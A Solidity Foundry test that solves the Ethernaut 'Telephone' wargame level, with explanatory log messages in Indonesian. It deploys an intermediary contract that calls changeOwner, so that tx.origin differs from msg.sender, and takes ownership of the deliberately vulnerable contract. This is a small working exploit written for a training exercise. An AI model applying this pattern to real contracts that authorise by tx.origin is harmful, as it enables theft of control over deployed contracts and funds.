// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../05-Telephone/TelephoneFactory.sol";
import "forge-std/Test.sol";

contract TelephoneAttack is Test {
    function testTelephone() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        TelephoneFactory factory = new TelephoneFactory();
        ethernaut.registerLevel(factory);
        emit log("register done");
        address agus = makeAddr("agus");
        vm.deal(agus, 10 ether);
        vm.startPrank(agus, agus);
        address addr = ethernaut.createLevelInstance(factory);
        Telephone telephone = Telephone(addr);
        bool beda = telephone.owner() == agus;
        assertFalse(beda);
        emit log("goal: klaim kepemilikan");
        emit log("Penjelasan");
        emit log("1. caller call contract A maka tx.origin dan msg.sender pada contract A = caller");
        emit log(
            "2. caller call contract A yang call contract B maka tx.origin dan msg.sender pada contract A = caller, tapi tx,origin pada contract B adalah caller, sedangkan msg.sender pada contract B adalah contract A"
        );
        emit log("PoC");
        emit log("- buat contract lain yang memanggil changeOwner pada contract Telephone");
        TelephoneHack hack = new TelephoneHack(address(telephone));
        hack.attack(address(agus));
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(address(telephone)));
        assertTrue(sukses);
    }
}

contract TelephoneHack {
    Telephone telephone;

    constructor(address telepon) {
        telephone = Telephone(telepon);
    }

    function attack(address attacker) external {
        telephone.changeOwner(attacker);
    }
}
